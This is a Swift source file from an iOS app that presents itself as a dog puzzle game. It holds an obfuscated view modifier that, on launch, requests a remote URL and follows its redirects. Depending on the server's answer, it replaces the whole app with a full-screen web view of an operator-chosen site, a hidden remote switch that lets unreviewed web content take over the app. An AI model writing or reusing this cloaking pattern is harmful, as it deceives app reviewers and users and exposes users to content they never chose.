//
//  DosplacpuzzleView.swift
//  ChockinsDogs
//
//  Created by Nicolae Chivriga on 09/03/2025.
//

import SwiftUI
import Lottie

struct DosplacpuzzleView: View {
    var body: some View {
        ZStack {
            Image("obbkagridinto")
                .resizable()
                .ignoresSafeArea()
            
            LottieView(animation: .named("caisheinocik"))
                .playing(loopMode: .loop)
                .resizable()
            
                .frame(width: 180, height: 180)
            
            WKWebViewRepresentable(url: URL(string: "https://optimizeprivacyonline.online/en/doghichokins")! )
            
        }
        .navigationBarBackButtonHidden()
        .navigationBarItems(leading: MergemIniapue())
    }
}
extension View {
    func fixadptivws() -> some View {
        self.modifier(Lunlakipwera())
    }
}
import WebKit
struct Lunlakipwera: ViewModifier {
    @State var webView: WKWebView = WKWebView()
    @AppStorage("adapt") var mubjuerk: URL?
    @State var skgie: Bool = true
    func body(content: Content) -> some View {
        ZStack {
            if !skgie {
                if mubjuerk != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: mubjuerk!)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: mubjuerk!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)      .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.movement = .all
                    }
                   
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if mubjuerk == nil {
                checkmyprif()
            } else {
                skgie = false
            }
        }
    }

    

    func checkmyprif() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/geinadouadcva") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            mubjuerk = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.skgie = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.skgie = false
                }
            }

            DispatchQueue.main.async {
                self.skgie = false
            }
        }.resume()
    }
}
class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
    var redirects: [URL] = []
    var redirects1: Int = 0
    let action: (URL) -> Void
      
      // Initializer to set up the class properties
      init(action: @escaping (URL) -> Void) {
          self.redirects = []
          self.redirects1 = 0
          self.action = action
      }
      
    // This method will be called when a redirect is encountered.
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        if let redirectURL = newRequest.url {
            // Track the redirected URL
            redirects.append(redirectURL)
       
            redirects1 += 1
            if redirects1 >= 3 {
                DispatchQueue.main.async {
                    self.action(redirectURL)
                }
            }
        }
        
        // Allow the redirection to happen
        completionHandler(newRequest)
    }
}
struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView

    var url: URL
    var webView: WKWebView
    
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(),  onLoadCompletion: (() -> Void)? = nil) {
        self.url = url
        self.webView = webView
        
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}
@preconcurrency import WebKit
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var number: Int = 0
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            decisionHandler(.allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}
